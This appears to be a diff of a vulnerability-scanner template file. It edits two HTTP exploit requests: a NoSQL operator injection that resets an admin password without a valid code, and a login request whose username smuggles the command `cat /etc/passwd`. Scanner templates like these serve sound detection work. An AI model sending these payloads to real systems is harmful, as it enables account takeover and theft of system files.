@@ -8590,7 +8590,7 @@
       "requests": [
         {
           "raw": [
-            "POST /admin/auth/reset-password HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/json\n{\"code\": {\"$gt\": 0}, \"password\": \"SuperStrongPassword1\", \"passwordConfirmation\": \"SuperStrongPassword1\"}\n"
+            "POST /admin/auth/reset-password HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/json\n\n{\"code\": {\"$gt\": 0}, \"password\": \"SuperStrongPassword1\", \"passwordConfirmation\": \"SuperStrongPassword1\"}\n"
           ]
         }
       ]
@@ -10545,8 +10545,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
